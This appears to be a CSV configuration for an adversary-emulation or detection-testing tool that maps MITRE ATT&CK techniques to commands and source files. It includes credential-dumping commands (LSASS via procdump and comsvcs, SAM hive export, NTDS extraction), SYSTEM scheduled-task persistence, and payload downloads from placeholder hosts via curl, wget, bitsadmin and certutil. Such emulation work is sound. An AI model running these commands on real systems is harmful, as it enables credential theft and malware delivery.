Technique,,,,,Variants,Tactic,Technique,Approves,Link
T1003.001,,,,,Open process + 2x Execute,Credential Access,OS Credential Dumping: LSASS Memory,1,https://attack.mitre.org/techniques/T1003/001/
exec,"""procdump -ma lsass.exe lsass_dump""",,,,,,,,
exec,"""rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID lsass.dmp full""",,,,,,,,
src,T1003.001.V1.cpp,,,,,,,,
T1003.002,,,,,3x Execute,Credential Access,OS Credential Dumping: Security Account Manager,1,https://attack.mitre.org/techniques/T1003/002/
exec,"""reg save HKLM\\sam sam""",,,0,,,,,
exec,"""reg save HKLM\\system system""",,,0,,,,,
exec,"""pwdumpx.exe > credentials.txt""",,,0,,,,,
T1003.003,,,,,1 Execute,Credential Access,OS Credential Dumping: NTDS,1,https://attack.mitre.org/techniques/T1003/003/
exec,"""msadcs.exe \""NTDS.dit\"" -s \""SYSTEM\"" -p a.txt --users-csv a.csv""",,,,,,,,
T1003.004,,,,,1 Registry,Credential Access,OS Credential Dumping: LSA Secrets,1,https://attack.mitre.org/techniques/T1003/004/
src,T1003.004.V1.cpp,,,,,,,,
T1010.000,,,,,Other,Discovery,Application Window Discovery,1,https://attack.mitre.org/techniques/T1010/
src,T1010.000.V1.cpp,,,,,,,,
T1053.005,,,,,1 execute,"Execution, Persistence, Privilege Escalation,",Scheduled Task/Job: Scheduled Task,1,https://attack.mitre.org/techniques/T1053/005/
exec,"""schtasks /create /tn \""abc\"" /tr C:\\x.exe /sc ONLOGON /ru \""System\""""",,,,,,,,
T1056.001,,,,,,"Collection, Credential Access",Input Capture: Keylogging,1,https://attack.mitre.org/techniques/T1056/001/
src,T1056.001.V1.cpp,,,,,,,,
T1059.001,,,,,PWSH  -exec ??,Execution,Command and Scripting Interpreter: PowerShell,1,https://attack.mitre.org/techniques/T1059/001/
exec,"""powershell.exe Start-Process -FilePath calc.exe""",,,,,,,,
exec,"""powershell.exe Invoke-Command -ScriptBlock { runme.exe }""",,,,,,,,
T1082.000,,,,,,Discovery,System Information Discovery,1,https://attack.mitre.org/techniques/T1082/
exec,"""systeminfo.exe /FO LIST""",,,,,,,,
exec,"""ver >> %temp%\\download""",,,,,,,,
exec,"""vssadmin list shadows""",,,,,,,,
src,T1082.000.V1.cpp,,,,,,,,
src,T1082.000.V2.cpp,,,,,,,,
T1083.000,,,,,,Discovery,File and Directory Discovery,1,https://attack.mitre.org/techniques/T1083/
exec,"""dir \""c:\\Program Files\\\"" >> %temp%\\exported_data""",,,,,,,,
src,T1083.000.V2.cpp,,,,,,,,
T1091.000,,,,,,"Lateral Movement, Initial Access",Replication Through Removable Media,1,https://attack.mitre.org/techniques/T1091/
src,T1091.000.V1.cpp,,,,,,,,
T1105.000,,,,,,Command and Control,Ingress Tool Transfer,1,https://attack.mitre.org/techniques/T1105/
exec,"""curl http:\\www.abc.xyz\\x.exe""",,,,,,,,
exec,"""wget http:\\www.abc.xyz\\x.exe""",,,,,,,,
exec,"""bitsadmin /create jb1""","""bitsadmin /addfile jb1 \""http://www.xyz.com/x.exe\"" \""C:\\temp\\x.exe\""""","""bitsadmin /resume jb1""","""bitsadmin / complete jb1""",,,,,
exec,"""certutil -urlcache -split -f http://www.xyz.com/x.exe C:\\temp\\x.exe""",,,,,,,,
src,T1105.000.V1.cpp,,,,,,,,
